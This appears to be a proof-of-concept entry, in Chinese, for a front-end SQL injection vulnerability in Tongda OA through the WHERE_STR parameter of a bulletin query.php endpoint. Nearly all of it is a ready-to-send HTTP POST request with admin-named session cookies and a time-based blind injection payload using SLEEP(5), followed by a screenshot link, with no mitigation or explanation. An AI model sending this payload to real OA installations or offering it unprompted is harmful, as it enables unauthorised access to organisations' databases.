## 通达OA-WHERE_STR存在前台SQL注入漏洞

## poc
```
POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=a817a534f7c99980f8be6ad061b4c2cb; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c589adfc; UI_COOKIE=0; KEY_RANDOMDATA=13568
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

WHERE_STR=-@`'` AND (SELECT 4916 FROM (SELECT(SLEEP(5)))Xsep)
```
![cb79742fa584a2c53129432d2c79eaed](https://github.com/wy876/POC/assets/139549762/90cd86b0-8e67-4eb8-bc38-896ad6b78be5)
